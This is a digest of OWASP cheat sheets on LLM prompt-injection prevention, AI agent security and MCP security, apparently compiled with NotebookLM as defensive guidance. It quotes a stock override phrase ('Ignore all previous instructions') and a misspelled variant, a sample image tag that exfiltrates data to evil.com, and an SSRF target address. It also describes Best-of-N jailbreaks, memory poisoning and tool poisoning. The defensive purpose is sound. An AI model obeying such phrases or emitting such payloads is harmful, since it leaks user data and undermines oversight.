# LLM, agent and MCP security

Synthesized with NotebookLM from the OWASP Cheat Sheet Series (CC BY-SA 4.0). It is a
digest, not the source: when a decision is high-stakes or a value looks surprising,
open the cheat sheet below and confirm it there.

## Sources

- [LLM Prompt Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/LLM_Prompt_Injection_Prevention_Cheat_Sheet.html)
- [AI Agent Security](https://cheatsheetseries.owasp.org/cheatsheets/AI_Agent_Security_Cheat_Sheet.html)
- [MCP Security](https://cheatsheetseries.owasp.org/cheatsheets/MCP_Security_Cheat_Sheet.html)

## Rules

### LLM Prompt Injection Prevention Cheat Sheet
- **Actionable Rules & Implementation Controls**:
  - **Direct vs. Indirect Prompt Injection**: Direct prompt injection occurs when malicious user input explicitly attempts to override system instructions (e.g., *"Ignore all previous instructions..."*). Indirect (remote) prompt injection occurs when malicious instructions are embedded within untrusted external content that the model processes (such as web pages, RAG vector documents, emails, code comments, pull request descriptions, or commit messages).
  - **Separating Instructions from Untrusted Data**: Use structured prompt formats and clear boundary delimiters (e.g., `SYSTEM_INSTRUCTIONS:` vs. `USER_DATA_TO_PROCESS:`) to explicitly differentiate trusted instructions from untrusted user or external data. Architectural patterns like CaMeL (Capabilities for Machine Learning) or Dual-LLM enforce strict data tracking where a privileged planning LLM creates execution plans without reading untrusted data, while a quarantined LLM reads untrusted data without tool execution capabilities.
  - **Input Validation & Sanitization**: Validate, normalize, and sanitize all user and external inputs before including them in model context. Apply string normalization (collapsing whitespace, stripping char repetition) and fuzzy/Damerau-Levenshtein distance matching to detect typoglycemia attacks (e.g., *"ignroe all prevoius instructions"*) and Base64/Hex/Unicode obfuscations.
  - **Output Validation & Guardrails**: Treat all LLM output as untrusted data. Validate and filter model outputs for system prompt leakage (e.g., `SYSTEM:`), credentials/secrets, and unescaped HTML/Markdown injection (e.g., hidden `<img src="http://evil.com/exfiltrate?data=...">` tags used for data exfiltration) before rendering or passing to downstream components. Deploy model-based guardrails (e.g., Llama Guard, ShieldGemma, Prompt Guard) as an additional input/output screening layer.
  - **Best-of-N (BoN) Jailbreak Mitigation**: Attackers systematically generate and test prompt variations (capitalization, character spacing, word shuffling) to exploit the non-deterministic nature of LLMs and bypass guardrails. Mitigate this by imposing strict request rate limiting per user/IP, capping retry budgets, and keeping authorization logic outside the model.
- **Most Common Mistakes**:
  - Concatenating user input or external content directly into system prompt strings without boundary separation.
  - Relying on prompt wording or simple text delimiters (e.g., `<user_input>`) as an authorization or security boundary.
  - Relying exclusively on regular expressions or keyword blocklists to detect prompt injection, which fail against typoglycemia, encoding tricks, and indirect injection.
  - Treating model-based guardrails ("LLM-as-judge") as a replacement for hard execution-level authorization and least-privilege tool controls.

### AI Agent Security Cheat Sheet
- **Actionable Rules & Implementation Controls**:
  - **Tool Security & Least Privilege**: Grant agents only the minimal tools and permissions required for their specific role. Enforce per-tool permission scoping (read-only vs. write, directory allowlists) and isolate tool sets between internal and user-facing agents.
  - **Tool Authorization Middleware**: Authorization checks must be enforced in the execution component outside the agent's context window—never rely on the LLM's own model output for authorization.
  - **Human-in-the-Loop (HITL) Controls for High-Impact Actions**: Classify tool actions by risk level (Low, Medium, High, Critical). Require explicit human approval for destructive, financial, administrative, or externally visible operations. Bind approval records to the exact actor, tool name, target resource, normalized parameters, and timestamp with a short expiration, consuming approvals in a single atomic step immediately before execution.
  - **Memory & Context Security**: Sanitize and validate data before writing to persistent agent memory. Enforce memory isolation per user/session, apply size limits and Time-To-Live (TTL) expiration, redact PII and credentials, and use cryptographic checksums (e.g., HMAC-SHA256) to ensure memory integrity against context poisoning.
  - **Multi-Agent Security & Trust Boundaries**: Treat inter-agent communications as crossing untrusted security boundaries. Authenticate communicating agents and enforce the sender's permissions at the receiving service before executing requests. Apply circuit breakers and rate limits to prevent cascading failures or runaway loops (Denial of Wallet).
  - **Logging, Observability & Anomaly Detection**: Log structured decision metadata for high-risk actions (action type, risk level, authorization outcome, approval ID, execution status, tool parameters). Redact sensitive keys (`password`, `api_key`, `secret`) from logs. Monitor for abnormal tool invocation frequencies, elevated privilege usage, high error rates, and approval bypass attempts.
- **Most Common Mistakes**:
  - Providing agents with over-permissioned tool configurations or wildcard permissions (e.g., unrestricted shell command execution).
  - Storing unvalidated user messages or external content in persistent agent memory, enabling cross-session memory poisoning attacks.
  - Using a simple `user_confirmed` boolean flag without binding the approval to the exact actor, tool call parameters, and timestamp, making it vulnerable to parameter tampering or replay.
  - Trusting inter-agent messages blindly without verifying sender identity or authorizing the requested action at the receiving component.

### MCP (Model Context Protocol) Security Cheat Sheet
- **Actionable Rules & Implementation Controls**:
  - **Tool Poisoning & Schema Integrity**: Inspect and validate all MCP tool descriptions, parameter names, types, and return schemas before approving servers. Cryptographically pin reviewed tool definitions (using SHA-256 hashes) to detect post-approval metadata changes ("rug pulls"). Set `additionalProperties: false` and strict regex patterns on string parameters in JSON Schema definitions.
  - **Confused Deputy & Token Passthrough Prevention**: MCP servers execute actions with their assigned privileges; servers must enforce user-level authorization and prevent confused deputy exploitation. Validate that incoming OAuth access tokens were explicitly issued for this specific MCP server (`aud` claim check) and never pass MCP access tokens to upstream APIs.
  - **MCP Server Authentication & Authorization**: Follow the MCP OAuth 2.1 profile over HTTP, requiring clients to identify the target MCP server using the `resource` parameter. Validate authorization on every request. Store OAuth tokens in OS-native secure keychains (e.g., macOS Keychain, Windows Credential Manager) rather than plaintext configuration files.
  - **Sandboxing & Isolation**: Run local MCP servers in a sandboxed environment (containers or restricted OS runtimes) enforcing minimal filesystem and network access. A bare `chroot` is not a process sandbox. For remote Streamable HTTP servers, validate the `Origin` header (reject invalid origins with HTTP 403) and `Host` header to block cross-site request forgery and DNS rebinding.
  - **Prompt Injection via Tool Return Values**: Treat every tool return value as untrusted data—even from approved MCP servers. Clearly label tool return data in the model context and extract structured fields rather than raw HTML to mitigate downstream prompt injection. Validate tool parameters before execution to prevent tool-induced SSRF (e.g., fetching internal cloud metadata endpoints `169.254.169.254`).
  - **Monitoring & Audit**: Log all MCP tool invocations with full parameters, user context, timestamps, and execution status, redacting sensitive parameters. Alert on unusual invocation patterns, tool shadowing (where one server's tool description manipulates behavior toward another server), or new tool additions.
- **Most Common Mistakes**:
  - Blindly trusting tool descriptions and schemas provided by MCP servers, exposing the LLM to tool poisoning or cross-server shadowing.
  - Sharing OAuth access tokens or static API credentials across multiple MCP servers.
  - Assuming that initial tool approval remains valid indefinitely without pinning schemas or detecting "rug pull" definition updates.
  - Running local MCP servers directly on the host OS without containerization or process sandboxing.
  - Passing raw tool return values directly into downstream execution components or URL-fetching logic without sanitization, triggering command injection or SSRF.
